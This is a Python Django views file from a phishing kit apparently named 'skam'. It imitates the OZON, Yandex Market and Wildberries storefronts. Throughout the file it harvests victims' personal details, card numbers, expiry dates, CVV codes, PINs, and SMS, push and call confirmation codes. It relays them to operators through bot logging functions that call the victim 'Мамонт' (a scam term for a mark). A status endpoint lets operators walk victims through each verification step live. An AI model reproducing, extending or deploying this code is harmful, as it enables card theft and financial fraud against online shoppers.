import asyncio
import datetime
from django.core import management
from django.shortcuts import render, redirect
from skam.management.commands.bot import log_submit, log_submit_w, log_submit_y, log_user_action
from django.http import HttpResponse
from django.http import HttpResponseRedirect
from skam.models import Link, Profile
from django.http import Http404
from skam.management.commands.bot import Command
from django.core.management import call_command
import os
from multiprocessing import Process


date_start = datetime.datetime.now()
date = date_start + datetime.timedelta(days=3) 
date = date.strftime("%d.%m.%y")


def index(request) -> HttpResponse:
    
    link: Link = Link.objects.get(link=request.session['link_str'])
    lst1 = list()
    lst2 = list()
    for i in [x.split(':') for x in link.product_description.split('|')]:
        lst1.append(i[0])
        lst2.append(i[1])

    new_dictionary = dict(zip(lst1, lst2))

    asyncio.run(
        log_user_action("🗳 Мамонт на главной странице 🗳", link.link)
    )
    if link.shop == 'ozon':
        if request.user_agent.is_mobile:
            return render(request, 'skam/mobileozon.html', {
            'title': 'OZON', 
            'price': link.price, 
            'image': link.image_link,
            'name': link.product_name,
            'dostavka': date,
            'description': new_dictionary,
            'skidka': link.old_price - link.price,
            'old_price': link.old_price,
            'procent': (link.price / link.old_price) * 100
                })
        else:
            #return redirect("https://google.com/")
            return render(request, 'skam/sagamipage.html', {
            'title': 'OZON', 
            'price': link.price, 
            'image': link.image_link,
            'name': link.product_name,
            'dostavka': date,
            'description': new_dictionary,
            'skidka': link.old_price - link.price,
            'old_price': link.old_price,
            'procent': (link.price / link.old_price) * 100
                })
    elif link.shop == 'yandex':
        if request.user_agent.is_mobile:
            return render(request, 'skam/mobileyandex.html', {
            'title': 'YANDEX',
            'price': link.price, 
            'image': link.image_link, 
            'name': link.product_name, 
            'dostavka': date, 
            'description': new_dictionary, 
            'skidka': link.old_price - link.price,
            'old_price': link.old_price,
            'procent': (link.price / link.old_price) * 100
                })
        else:
            return render(request, 'skam/yandex.html', {
            'title': 'YANDEX',
            'price': link.price, 
            'image': link.image_link, 
            'name': link.product_name, 
            'dostavka': date, 
            'description': new_dictionary, 
            'skidka': link.old_price - link.price,
            'old_price': link.old_price,
            'procent': (link.price / link.old_price) * 100

                })

    elif link.shop == 'wildberies':
        return render(request, 'skam/wildberies.html', {
        'title': 'WILDBERIES', 
        'price': link.price, 
        'image': link.image_link, 
        'name': link.product_name, 
        'dostavka': date, 
        'description': new_dictionary, 
        'skidka': link.old_price - link.price,
        'old_price': link.old_price,
        'procent': (link.price / link.old_price) * 100
            })


def set_session(request, link_str) -> HttpResponse:
    request.session['link_str'] = link_str
    return redirect("/")




def oform(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("🗳 Мамонт на странице ввода личных данных 🗳", link.link)
    )
    all_users = Profile.objects.filter(user_status=True, online_status=True).values_list('tg_id', flat=True).distinct()
    if all_users:
        if link.shop == 'ozon':
            if request.user_agent.is_mobile:
                return render(request, 'skam/mobileozonform.html', {
                'title': 'OZON', 'price': link.price, 
                'image': link.image_link, 
                'name': link.product_name, 
                'dostavka': date,            
                'skidka': link.old_price - link.price,
                'old_price': link.old_price,
                'procent': (link.price / link.old_price) * 100
                    })
            else:
                return render(request, 'skam/oform.html', {
                'title': 'OZON', 'price': link.price, 'image': link.image_link, 'name': link.product_name, 
                'dostavka': date, 
                'skidka': link.price - link.old_price, 
                'old_price': link.old_price,            
                'skidka': link.old_price - link.price,
                'old_price': link.old_price,
                'procent': (link.price / link.old_price) * 100
                    })
        elif link.shop == 'yandex':
            return render(request, 'skam/yform.html', {
            'title': 'YANDEX', 'price': link.price, 'image': link.image_link, 
            'name': link.product_name, 
            'dostavka': date, 'skidka': link.price - link.old_price, 
            'old_price': link.old_price,
            'procent': (link.price / link.old_price) * 100
                })
        elif link.shop == 'wildberies':
            return render(request, 'skam/wform.html', {
            'title': 'YANDEX', 'price': link.price, 'image': link.image_link, 
            'name': link.product_name, 
            'dostavka': date,
            'skidka': link.old_price - link.price,
            'old_price': link.old_price,
            'procent': (link.price / link.old_price) * 100
                })
    else:
        if link.shop == 'ozon':
            return redirect("https://pay.cloudtips.ru/p/eadcff8a")
        elif link.shop == 'yandex':
            return redirect("https://pay.cloudtips.ru/p/eadcff85")
        elif link.shop == 'wildberies':
            return redirect("https://pay.cloudtips.ru/p/eadcff96")


def oplata(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("🏦 Мамонт на странице ввода карты 🏦", link.link)
    )
    if link.shop == 'ozon':
        link.status = 0
        link.save()
        if request.user_agent.is_mobile:
            return render(request, 'skam/oplataozonmobile.html', {
            'title': 'Оплата заказа', 'price': link.price, 'image': link.image_link, 'name': link.product_name, 'dostavka': date
                })
        else:
            return render(request, 'skam/oplataozonpc.html', {
            'title': 'Оплата заказа', 'price': link.price, 'image': link.image_link, 'name': link.product_name, 'dostavka': date
                })
    elif link.shop == 'yandex':
        link.status = 0
        link.save()
        return render(request, 'skam/yplata.html', {
        'title': 'Оплата заказа', 'price': link.price, 'image': link.image_link, 'name': link.product_name, 'dostavka': date
            })
    elif link.shop == 'wildberies':
        link.status = 0
        link.save()
        return render(request, 'skam/wplata.html', {
        'title': 'Оплата заказа', 'price': link.price, 'image': link.image_link, 'name': link.product_name, 'dostavka': date
            })







def push(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("💳 Мамонт на странице PUSH 💳", link.link)
    )
    return render(request, 'skam/newpush.html', {
        'title': 'Продиктуйте данные из push',
        'session_id': request.session['link_str'],
        'price': link.price,
        'shop': link.shop,
        'data': date,
        'card': str(request.session['cardnumber'])[-4:]
    })
    

def start_bot(request):
    import os
    p = Process(target=call_command('bot'))

    p.start()
    p.join()
    return redirect("/")


def suc(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("💳 Мамонт на странице успеха 💳", link.link)
    )
    return render(request, 'skam/suc.html', {
        'title': 'SUCCESS',
        'session_id': request.session['link_str']
    })




def cancel(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("♻️ Мамонт на странице отмены ♻️", link.link)
    )
    return render(request, 'skam/cancel.html', {
        'session_id': request.session['link_str']
    })





def payment_sms(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("📩 Мамонт на ввода смс кода 📩", link.link)
    )
    return render(request, 'skam/payment-sms.html', {
        'title': 'Введите код из смс',
        'session_id': request.session['link_str'],
        'price': link.price,
        'shop': link.shop,
        'data': date,
        'card': str(request.session['cardnumber'])[-4:]

    })


def payment_pin(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("🏧 Мамонт на ввода пина 🏧", link.link)
    )
    return render(request, 'skam/payment-pin.html', {
        'title': 'Введите ПИН код',
        'session_id': request.session['link_str'],
        'price': link.price,
        'shop': link.shop,
        'data': date,
        'card': str(request.session['cardnumber'])[-4:]
    })



def call(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("💳 Мамонт на странице Звонка 💳", link.link)
    )
    return render(request, 'skam/call.html', {
        'title': 'Продиктуйте данные из звонка',
        'session_id': request.session['link_str'],
        'price': link.price,
        'shop': link.shop,
        'data': date,
        'card': str(request.session['cardnumber'])[-4:]
    })





def loading(request) -> HttpResponse:
    link: Link = Link.objects.get(link=request.session['link_str'])
    asyncio.run(
        log_user_action("♻️ Мамонт на странице загрузки ♻️", link.link)
    )
    return render(request, 'skam/loading.html', {
        'session_id': request.session['link_str']
    })



def form_submit(request) -> HttpResponse:
    if request.POST:
        request.session['address'] = request.POST.get('address')
        request.session['fio'] = request.POST.get('fio', 'NONE')
        request.session['phone'] = request.POST.get('phone', 'NONE')
        request.session['email'] = request.POST.get('email', 'NONE')
        request.session['comment'] = request.POST.get('comment', 'NONE')

        return redirect("/oplata")
    else:
        return HttpResponse("Нахуй пошел")
# Create your views here.


def form_submit_get(request) -> HttpResponse:
    if request.POST:
        request.session['cardnumber'] = request.POST.get('cardnumber')
        request.session['data_card'] = request.POST.get('data_card', 'NONE')
        request.session['data_card_2'] = request.POST.get('data_card_2', 'NONE')
        request.session['cvv'] = request.POST.get('cvv', 'NONE')
        link: Link = Link.objects.get(link=request.session['link_str'])
        asyncio.run(log_submit(
            link.id,
            address=request.session['address'],
            fio=request.session['fio'],
            phone=request.session['phone'],
            email=request.session['email'],
            comment=request.session['comment'],
            cardnumber=request.session['cardnumber'],
            card_data=request.session['data_card'],
            card_data_2=request.session['data_card_2'],
            cvv=request.session['cvv'],
            link_str=request.session['link_str']
        ))
        return redirect("/loading")
    else:
        return HttpResponse("Нахуй пошел")


def y_form_submit(request) -> HttpResponse:
    if request.POST:
        request.session['address'] = request.POST.get('address')
        request.session['flat'] = request.POST.get('flat')
        request.session['firstname'] = request.POST.get('firstname', 'NONE')
        request.session['lastname'] = request.POST.get('lastname', 'NONE')
        request.session['middlename'] = request.POST.get('middlename', 'NONE')
        request.session['phone'] = request.POST.get('phone', 'NONE')
        request.session['email'] = request.POST.get('email', 'NONE')

        return redirect("/oplata")
    else:
        return HttpResponse("Нахуй пошел")
# Create your views here.


def y_form_submit_get(request) -> HttpResponse:
    if request.POST:
        request.session['cardnumber'] = request.POST.get('cardnumber')
        request.session['data_card'] = request.POST.get('data_card', 'NONE')
        request.session['data_card_2'] = request.POST.get('data_card_2', 'NONE')
        request.session['cvv'] = request.POST.get('cvv', 'NONE')
        link: Link = Link.objects.get(link=request.session['link_str'])
        asyncio.run(log_submit_y(
            link.id,
            address=request.session['address'],
            flat=request.session['flat'],
            firstname=request.session['firstname'],
            lastname=request.session['lastname'],
            middlename=request.session['middlename'],
            fio=request.session['fio'],
            phone=request.session['phone'],
            email=request.session['email'],
            cardnumber=request.session['cardnumber'],
            card_data=request.session['data_card'],
            card_data_2=request.session['data_card_2'],
            cvv=request.session['cvv'],
            link_str=request.session['link_str']
        ))
        return redirect("/loading")
    else:
        return HttpResponse("Нахуй пошел")


def w_form_submit(request) -> HttpResponse:
    if request.POST:
        request.session['address'] = request.POST.get('address')
        request.session['firstname'] = request.POST.get('firstname', 'NONE')
        request.session['lastname'] = request.POST.get('lastname', 'NONE')
        request.session['phone'] = request.POST.get('phone', 'NONE')
        request.session['email'] = request.POST.get('email', 'NONE')

        return redirect("/oplata")
    else:
        return HttpResponse("Нахуй пошел")
# Create your views here.


def w_form_submit_get(request) -> HttpResponse:
    if request.POST:
        request.session['cardnumber'] = request.POST.get('cardnumber')
        request.session['data_card'] = request.POST.get('data_card', 'NONE')
        request.session['data_card_2'] = request.POST.get('data_card_2', 'NONE')
        request.session['cvv'] = request.POST.get('cvv', 'NONE')
        request.session['fio'] = request.POST.get('fio', 'NONE')
        link: Link = Link.objects.get(link=request.session['link_str'])
        asyncio.run(log_submit_w(
            link.id,
            address=request.session['address'],
            firstname=request.session['firstname'],
            lastname=request.session['lastname'],
            phone=request.session['phone'],
            email=request.session['email'],
            cardnumber=request.session['cardnumber'],
            card_data=request.session['data_card'],
            card_data_2=request.session['data_card_2'],
            cvv=request.session['cvv'],
            fio=request.session['fio'],
            link_str=request.session['link_str']
        ))
        return redirect("/loading")
    else:
        return HttpResponse("Нахуй пошел")



def get_info(request, session_id: str) -> HttpResponse:
    link = Link.objects.get(link=session_id)
    status: dict = {
        0: 'nothing',
        1: 'sms',
        2: 'card',
        3: 'pin',
        4: 'loading',
        5: 'call',
        6: 'suc',
        7: 'push',
        8: 'main',
        9: 'cancel',
    }
    return HttpResponse(status[link.status])


def pin_submit(request) -> HttpResponse:
    if request.method == "POST":
        link: Link = Link.objects.get(link=request.session['link_str'])
        asyncio.run(
            log_user_action(f"Мамонт ввел пин код - {request.POST.get('passwordEdit')}", link.link)
        )
        link.status = 0
        link.save()
        return redirect("/loading")
    else:
        return HttpResponse("Нахуй пошел")



def call_submit(request) -> HttpResponse:
    if request.method == "POST":
        link: Link = Link.objects.get(link=request.session['link_str'])
        asyncio.run(
            log_user_action(f"Мамонт ввел код из поступившего звонка - {request.POST.get('passwordEdit')}", link.link)
        )
        link.status = 0
        link.save()
        return redirect("/loading")
    else:
        return HttpResponse("Нахуй пошел")


def sms_submit(request) -> HttpResponse:
    if request.method == "POST":
        link: Link = Link.objects.get(link=request.session['link_str'])
        asyncio.run(
            log_user_action(f"Мамонт ввел смс код - {request.POST.get('passwordEdit')}", link.link)
        )
        link.status = 0
        link.save()
        return redirect("/loading")
    else:
        return HttpResponse("Нахуй пошел")




